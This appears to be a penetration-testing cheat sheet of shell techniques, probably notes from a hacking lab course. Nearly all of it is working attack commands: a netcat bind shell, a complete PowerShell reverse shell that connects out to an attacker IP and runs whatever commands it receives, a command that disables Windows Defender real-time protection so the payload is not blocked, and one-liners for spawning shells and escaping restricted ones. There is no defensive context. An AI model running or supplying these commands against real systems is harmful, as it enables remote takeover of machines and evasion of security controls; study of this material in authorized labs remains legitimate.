## Shell Basics

### Bind Shell

Target system has a listener started and awaits connection from our system. Target inbound.

```bash
## Server - Binding Bash shell to TCP session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

## Client - Connect to bind shell on target
nc -nv 10.129.41.200 7777
```

### Reverse Shell

Attack box will have listener running and target initiates connection. Target outbound.

```powershell
## Attack box - Act as server
sudo nc -lvnp 443

## Client - Target
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


## Disable Client AV if AV stops above command
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Spawning Shell

```bash
## Python TTY Shell
python -c 'import pty; pty.spawn("/bin/sh")' 

## Perl Interactive Shell
perl —e 'exec "/bin/sh";'

## Ruby Interactive Shell
ruby: exec "/bin/sh"

## Lua Interactive Shell
lua: os.execute('/bin/sh')

## AWK To Shell
awk 'BEGIN {system("/bin/sh")}'

## Find For A Shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

## Vim To Shell
vim -c ':!/bin/sh'

## Vim Escape
vim
:set shell=/bin/sh
:shell
```